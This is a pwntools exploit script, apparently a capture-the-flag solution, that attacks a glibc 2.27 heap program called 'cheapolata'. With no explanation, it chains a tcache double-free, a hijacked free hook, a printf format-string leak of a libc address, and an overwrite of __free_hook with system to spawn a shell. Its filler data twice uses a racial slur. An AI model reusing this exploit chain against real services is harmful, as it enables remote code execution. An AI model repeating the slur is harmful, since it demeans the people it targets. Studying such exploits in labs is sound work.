from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

elf = ELF('./cheapolata')
libc = ELF('./libc-2.27.so')
ld = ELF('./ld-2.27.so')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process([ld.path, elf.path], env={'LD_PRELOAD': libc.path})

def malloc(size, data):
    io.sendlineafter(b'>>> ', b'1')
    io.sendlineafter(b'Size: ', size)
    io.sendlineafter(b'Content: ', data)

def free():
    io.sendlineafter(b'>>> ', b'2')

old_free_hook = elf.sym['old_free_hook']
printf_plt = elf.plt['printf']
__free_hook = elf.sym['__free_hook']

malloc(b'20', b'chunk0')
free()
free()

malloc(b'30', b'chunk1')
free()
free()

malloc(b'20', p64(old_free_hook))
malloc(b'20', b'nigga')
malloc(b'20', p64(printf_plt))
malloc(b'20', b'%25$p')
free()

libc_start_main = int(io.recvuntil(b"==", drop=True), 0) 
libc.address = libc_start_main - 621607
log.info(f'libc base: {hex(libc.address)}')

system = libc.sym.system

malloc(b"30", p64(__free_hook))
malloc(b"30", b"nigga2")
malloc(b"30", p64(system))

malloc(b"20", b"/bin/sh")

free()

io.interactive()
